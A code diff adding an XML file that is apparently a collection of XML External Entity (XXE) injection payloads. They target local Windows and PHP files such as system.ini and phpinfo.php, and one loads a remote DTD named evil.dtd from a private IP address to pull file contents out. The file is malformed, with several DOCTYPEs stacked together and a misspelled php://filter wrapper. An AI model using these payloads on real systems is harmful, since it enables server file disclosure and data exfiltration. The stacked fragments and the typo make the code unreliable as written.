@@ -1,0 +1,41 @@
+<?xml version="1.0"?>
+
+<!DOCTYPE message [
+    <!ENTITY normal "hello">
+    <!ENTITY % normal2 "hello">
+    <!ENTITY normal3 SYSTEM "file:///c:/windows/system.ini">
+    <!-- %normal2; -->
+
+]>
+<message>&normal3;</message>
+
+<!-- <!DOCTYPE creds [  
+<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
+<creds>&goodies;</creds> -->
+
+<!-- 
+<!DOCTYPE root [
+    <!ENTITY % out '<!ENTITY &#37; files SYSTEM "file:///c:/windows/sys.ini">'>
+]>
+<root>&files;</root> -->
+
+
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE roottag [
+    <!ENTITY % start "<![CDATA[">   
+    <!ENTITY % goodies SYSTEM "file:///c:/phpstudy/www/phpinfo.php">  
+    <!ENTITY % end "]]>"> 
+    <!ENTITY % dtd SYSTEM "http://172.16.105.95/evil.dtd"> 
+    %dtd;
+]> 
+<roottag>&all;</roottag>
+
+
+
+
+<!DOCTYPE message [
+    <!ENTITY normal "hello">
+    <!ENTITY % normal2 "hello">
+    <!ENTITY normal3 SYSTEM "php://filte/read=convert.base64-encode/resource=C:/phpstudy/www/phpinfo.php">
+]>
+<message>&normal3;</message>
